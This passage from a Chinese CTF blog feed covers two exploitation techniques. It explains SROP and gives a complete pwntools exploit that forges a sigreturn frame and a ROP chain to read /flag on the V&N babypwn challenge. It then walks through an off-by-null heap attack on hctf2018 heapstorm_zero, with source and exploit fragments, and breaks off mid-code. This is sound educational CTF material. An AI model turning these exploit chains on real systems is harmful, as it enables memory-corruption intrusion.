class="keyword">__uint64_t</span> r12;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由于<code>Signal Frame</code>是在用户态的栈中，因此若在栈中伪造<code>Signal Frame</code>，同时调<code>sigreturn</code>系统调用，即可实现对所有寄存器的控制包括rip，从而实现攻击。</p><p>如若只想调用执行一个函数，如get shell，则可直接将rip指向system，将rdi指向binsh地址即可，如下图所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-2.png" class="lozad"></p><p>如果想执行一系列函数，我们可以通过rsp指针来实现相应的rop链，包括两个步骤：</p><ul><li>控制栈指针。</li><li>把原来 rip 指向的syscall gadget 换成syscall; ret gadget。</li></ul><p>示意图如下所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-3.png" class="lozad"></p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>以V&amp;N招新赛babypwn为例</p><p>思路如下：</p><p>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><p>参考文章  :</p><p><a href="https://ray-cp.github.io/archivers/srop-analysis" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/srop-analysis</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是SROP&quot;&gt;&lt;a href=&quot;#什么是SROP&quot; class=&quot;headerlink&quot; title=&quot;什么是SROP&quot;&gt;&lt;/a&gt;什么是SROP&lt;/h2&gt;&lt;p&gt;&lt;code&gt;SROP&lt;/code&gt; 全称&lt;code&gt;Sigreturn Oriented Progr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>off-by-null</title>
    <link href="https://nocbtm.github.io/2020/02/28/off-by-null/"/>
    <id>https://nocbtm.github.io/2020/02/28/off-by-null/</id>
    <published>2020-02-28T08:47:12.000Z</published>
    <updated>2020-04-07T03:40:06.561Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>off by null 是一个比较有意思的技术 下面通过 hctf2018 的 heapstrom_zero 实战一波。</p><p>题目链接 <a href="https://github.com/veritas501/hctf2018" target="_blank" rel="noopener">https://github.com/veritas501/hctf2018</a></p><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>直接拿源码分析，程序是一个比较简单的菜单程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">int main(void)&#123;</span><br><span class="line">init();</span><br><span class="line">while(1)&#123;</span><br><span class="line">switch(menu_getinput())&#123;</span><br><span class="line">case 1:&#123;</span><br><span class="line">Allocate();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 2:&#123;</span><br><span class="line">View();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 3:&#123;</span><br><span class="line">Delete();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 4:&#123;</span><br><span class="line">puts(&quot;Bye!&quot;);</span><br><span class="line">exit(0);</span><br><span class="line">&#125;</span><br><span class="line">default:&#123;</span><br><span class="line">puts(&quot;Invaild choice!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先初始化一些东西，比如随机 mmap 一块内存用来存放指针之类的。然后提供三个选项供用户选择。</p><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p>看看 init 函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">sum=<span class="number">0</span>;</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Open urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> * pageaddr;</span><br><span class="line"><span class="keyword">if</span>(read(fd,&amp;pageaddr,<span class="keyword">sizeof</span>(<span class="keyword">void</span> *)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Read urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">pageaddr = (<span class="keyword">void</span> *)(((<span class="keyword">size_t</span>)(pageaddr)&amp;~<span class="number">0xfff</span>)%<span class="number">0x133700000000</span>);</span><br><span class="line"><span class="comment">// 随机mmap 一块内存，存放程序分配的内存指针</span></span><br><span class="line">page = mmap(pageaddr,<span class="number">0x1000</span>,<span class="number">3</span>,<span class="number">34</span>,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(page != pageaddr)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"mmap error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 随机生成秘钥，用于加密指针</span></span><br><span class="line"><span class="keyword">if</span>(read(fd,&amp;(page-&gt;xorkey),<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Read urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x20</span>;i++)&#123;</span><br><span class="line">page-&gt;chunk[i]=(<span class="keyword">char</span> *)page-&gt;xorkey;</span><br><span class="line">&#125;</span><br><span class="line">bar();</span><br><span class="line">close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配一块内存，然后生成一个随机秘钥，秘钥的作用是把程序分配的内存的指针异或加密一下。</p><h3 id="Allocate"><a href="#Allocate" class="headerlink" title="Allocate"></a>Allocate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Allocate</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">if</span>(sum &gt; <span class="number">0x20</span>u)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Too many chunks!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk size:"</span>);</span><br><span class="line"><span class="keyword">int</span> size = read_int();   </span><br><span class="line"><span class="comment">// size 最大为0x38</span></span><br><span class="line"><span class="keyword">if</span>(!check_chunksize(size))&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Invalid size!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * p = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(size, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(!p)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Alloc error!!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk content:"</span>);</span><br><span class="line"><span class="comment">// read_n 会向p[size]='\x00',所以有一字节的溢出，溢出的字节为'\x00'</span></span><br><span class="line">read_n(p, size);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; (<span class="keyword">size_t</span>)page-&gt;chunk[i]^page-&gt;xorkey; ++i )&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( i == <span class="number">32</span> )&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Too many chunks!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 指针xor加密存放</span></span><br><span class="line">page-&gt;chunk[i] = (<span class="keyword">char</span>*)((<span class="keyword">size_t</span>)p^page-&gt;xorkey);</span><br><span class="line">++sum;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Chunk index: %d\n"</span>,i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先让用户输入一个 size , 然后判断 size 最大只能为 0x38 ， 这意味着我们只能分配 fastbin 的 chunk. 分配好内存后，会读入数据到里面，这时候会有一个 \x00 字节的溢出。</p><h3 id="View"><a href="#View" class="headerlink" title="View"></a>View</h3><p>就是把指针解密出来，然后用 printf 打印内容。</p><h3 id="Delete"><a href="#Delete" class="headerlink" title="Delete"></a>Delete</h3><p>解密出指针，然后释放掉，同时把相关的项设置为初始状态。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Delete</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk index: "</span>);</span><br><span class="line"><span class="keyword">int</span> idx = read_int();</span><br><span class="line"><span class="keyword">if</span> ( idx &lt; <span class="number">0</span> || idx &gt; <span class="number">31</span> )&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Invalid index!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *p = (<span class="keyword">char</span>*)((<span class="keyword">size_t</span>)page-&gt;chunk[idx]^page-&gt;xorkey);</span><br><span class="line"><span class="keyword">if</span> ( p )</span><br><span class="line">&#123;</span><br><span class="line">--sum;</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">page-&gt;chunk[idx] = (<span class="keyword">char</span>*)(page-&gt;xorkey);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>总结一下程序的功能。</p><p>我们最多只能 malloc(0x38) 即 0x40 大小的 chunk.<br>有一个 打印 chunk 内容的函数。<br>分配时可以 off by null.</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>一字节溢出的利用围绕着的是 堆块在分配，释放，合并时对 chunk 的 size 域的信任关系。而如果只是 fastbin 的话 off by null 是没法利用的，因为只要溢出就会把 size 设置为 0.</p><p>这里有一个 tips , 使用 scanf 获取内容时，如果 输入字符串比较长会调用 malloc 来分配内存。</p><p>在 malloc 分配内存时，首先会一次扫描一遍 fastbin , smallbin ， unsorted bin ，largebin, 如果都找不到可以分配的 chunk 分配给用户 ， 会进入 top_chunk 分配的流程， 如果此时还有 fastbin ，就会触发堆合并机制，把 fastbin 合并 之后放入 smallbin，再看能否分配，不能的话会使用 top_chunk 进行分配。</p><p>于是利用 scanf 能分配大内存的特性，我们可以触发 堆合并，然后让 fastbin 合并成一个 smallbin , 然后在触发 off-by-null , 就是常规的利用思路了。</p><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>首先分配 12 个 chunk, 其中 第一个 和最后一个保留， 第一个 chunk 用于 触发 off-by-null ， 最后一个用于防止在 堆合并时与 top_chunk 进行合并。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'x'</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 9</span></span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x20</span> + p64(<span class="number">0x200</span>) + p64(<span class="number">0x20</span>)  <span class="comment"># shrink chunk 前，配置好</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 10</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'end'</span>)  <span class="comment"># 11  , 保留块， 防止和 top chunk 合并</span></span><br></pre></td></tr></table></figure><p>然后把中间的 10 个 chunk 释放掉，同时触发 堆合并，构造一个 0x210 大小的 smallbin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 释放掉 chunk</span><br><span class="line">for i in range(1, 11):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line"># 利用 scanf 分配大内存 0x400+ , 会触发堆合并</span><br><span class="line"># fastbin 会合并进入 smallbin</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure></p><p>函数 triger_consolidate 的逻辑就是发送 0x400 的字符串给 scanf 处理，然后 scanf 会分配大内存，触发 堆合并。</p><p>此时的内存布局如下</p><p><img alt="" data-src="/imgs/off-by-null-1.png" class="lozad"></p><p>图中特殊标出的 0x200 | 0x20 用于保证后续利用过掉 check.</p><p>然后利用 chunk 0 , 溢出 一字节的 \x00 , 修改下面那个 smallbin 的 size —&gt; 0x200</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用 chunk 0 , 溢出 一字节的 \x00 , 修改 size ---&gt; 0x200</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 0</span></span><br></pre></td></tr></table></figure><p>紧接着在这个剩下的 0x200 字节的 smallbin 里面分配 8 个 chunk , 然后利用同样的方法，在里面构造一个 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 